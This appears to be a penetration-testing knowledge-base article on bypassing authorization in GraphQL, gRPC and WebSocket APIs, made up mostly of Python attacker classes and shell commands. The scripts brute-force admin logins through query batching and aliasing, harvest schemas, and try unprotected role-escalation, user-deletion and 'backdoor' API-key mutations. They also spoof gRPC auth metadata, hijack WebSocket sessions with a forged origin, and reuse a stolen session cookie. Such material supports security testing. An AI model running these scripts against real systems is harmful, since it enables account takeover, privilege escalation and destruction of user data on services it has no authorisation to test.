# KB-38: GraphQL, gRPC & WebSocket Auth Bypass

## Overview

Modern API protocols (GraphQL, gRPC, WebSocket) have unique auth bypass vectors not covered by traditional REST API testing.

---

## 1. GraphQL Auth Bypass

### 1.1 Batching & Aliasing Attacks

```python
class GraphQLAuthAttacker:
    def __init__(self, endpoint):
        self.endpoint = endpoint

    def test_batching_rate_limit_bypass(self):
        # Batch queries bypass per-request rate limits
        batch = [
            {"query": "mutation { login(email:\"admin@target.com\", password:\"pass%d\") { token } }" % i}
            for i in range(100)
        ]
        resp = requests.post(self.endpoint, json=batch)
        if resp.status_code == 200:
            results = resp.json()
            for r in results:
                if r.get('data', {}).get('login', {}).get('token'):
                    print("[CRITICAL] Login brute force via batching!")

    def test_aliasing_bypass(self):
        # Aliases execute multiple operations in single query
        query = "query {\n"
        for i in range(100):
            query += f'  attempt{i}: login(email:"admin@target.com", password:"pass{i}") {{ token }}\n'
        query += "}"
        resp = requests.post(self.endpoint, json={"query": query})
        if resp.status_code == 200:
            print("[HIGH] Alias-based brute force succeeded")

    def test_introspection(self):
        query = {"query": "{ __schema { types { name fields { name type { name } } } } }"}
        resp = requests.post(self.endpoint, json=query)
        if resp.status_code == 200 and '__schema' in resp.text:
            print("[HIGH] Introspection enabled — full schema exposed")
            # Look for admin mutations
            schema = resp.json()
            for t in schema.get('data', {}).get('__schema', {}).get('types', []):
                for f in t.get('fields', []) or []:
                    if any(kw in f['name'].lower() for kw in ['admin', 'delete', 'role', 'permission']):
                        print(f"  [!] Sensitive: {t['name']}.{f['name']}")

    def test_nested_query_auth(self):
        # Nested relationships may bypass field-level auth
        queries = [
            '{ users { id email role adminPanel { secrets } } }',
            '{ user(id: 1) { posts { author { role email passwordHash } } } }',
            '{ __type(name: "User") { fields { name } } }',
        ]
        for q in queries:
            resp = requests.post(self.endpoint, json={"query": q})
            if resp.status_code == 200 and 'errors' not in resp.json():
                print(f"[+] Query returned data: {q[:60]}...")

    def test_mutation_auth(self):
        mutations = [
            'mutation { updateUserRole(userId: "1", role: "admin") { id role } }',
            'mutation { deleteUser(id: "1") { success } }',
            'mutation { createApiKey(name: "backdoor") { key } }',
        ]
        for m in mutations:
            resp = requests.post(self.endpoint, json={"query": m})
            if resp.status_code == 200 and 'errors' not in resp.json():
                print(f"[CRITICAL] Unprotected mutation: {m[:60]}...")
```

---

## 2. gRPC Auth Bypass

### 2.1 Metadata Manipulation

```python
import grpc

class GRPCAuthAttacker:
    def test_metadata_injection(self, channel, service_stub):
        # gRPC uses metadata for auth — similar to HTTP headers
        metadata = [
            ('authorization', 'Bearer invalid-but-try'),
            ('x-forwarded-for', '127.0.0.1'),
            ('x-user-role', 'admin'),
            ('x-user-id', '1'),
        ]
        try:
            resp = service_stub.AdminMethod(request, metadata=metadata)
            print(f"[CRITICAL] gRPC admin method accessible with injected metadata")
        except grpc.RpcError as e:
            print(f"[*] Status: {e.code()}")

    def test_reflection(self, target):
        # gRPC reflection exposes all services and methods
        # grpcurl -plaintext target:50051 list
        # grpcurl -plaintext target:50051 describe service.AdminService
        import subprocess
        result = subprocess.run(['grpcurl', '-plaintext', target, 'list'],
                                capture_output=True, text=True)
        if result.returncode == 0:
            print(f"[HIGH] gRPC reflection enabled:")
            for svc in result.stdout.strip().split('\n'):
                print(f"  Service: {svc}")
                # Describe each service
                desc = subprocess.run(['grpcurl', '-plaintext', target, 'describe', svc],
                                       capture_output=True, text=True)
                for line in desc.stdout.split('\n'):
                    if 'rpc' in line.lower():
                        print(f"    {line.strip()}")

    def test_plaintext_channel(self, target):
        # Test if gRPC accepts plaintext (no TLS)
        channel = grpc.insecure_channel(target)
        try:
            grpc.channel_ready_future(channel).result(timeout=5)
            print(f"[HIGH] gRPC accepts plaintext connections — no TLS!")
        except: pass
```

---

## 3. WebSocket Auth Bypass

### 3.1 Connection Upgrade Auth Gap

```python
import websocket
import json

class WebSocketAuthAttacker:
    def test_upgrade_without_auth(self, ws_url):
        # WebSocket upgrade may not require auth if only checked at HTTP level
        try:
            ws = websocket.create_connection(ws_url)
            ws.send(json.dumps({"action": "getUsers"}))
            result = ws.recv()
            print(f"[CRITICAL] WebSocket accessible without auth: {result[:200]}")
            ws.close()
        except Exception as e:
            print(f"[-] Connection failed: {e}")

    def test_cswsh(self, ws_url, origin='https://attacker.com'):
        # Cross-Site WebSocket Hijacking — no Origin validation
        try:
            ws = websocket.create_connection(ws_url, origin=origin)
            ws.send(json.dumps({"action": "getProfile"}))
            result = ws.recv()
            print(f"[CRITICAL] CSWSH — accepted Origin: {origin}")
            ws.close()
        except: pass

    def test_post_auth_message_injection(self, ws_url, auth_token):
        # Authenticate then send privileged messages
        ws = websocket.create_connection(ws_url,
            header=[f"Authorization: Bearer {auth_token}"])
        # Try admin actions with regular user token
        admin_msgs = [
            {"action": "admin.listUsers"},
            {"action": "admin.deleteUser", "userId": "1"},
            {"action": "admin.updateRole", "userId": "1", "role": "admin"},
        ]
        for msg in admin_msgs:
            ws.send(json.dumps(msg))
            result = ws.recv()
            if 'error' not in result.lower():
                print(f"[CRITICAL] Admin action succeeded: {msg['action']}")
```

### 3.2 WebSocket Protocol-Level Attacks

```bash
# Test WebSocket endpoints
# 1. Upgrade without cookies
wscat -c "wss://target.com/ws"

# 2. Upgrade with stolen session
wscat -c "wss://target.com/ws" -H "Cookie: session=stolen_value"

# 3. Test message-level auth
# Many apps only auth the upgrade, not individual messages
```

## References

- GraphQL security best practices (OWASP)
- gRPC authentication documentation
- WebSocket security (RFC 6455 Section 10)
- CSWSH research papers
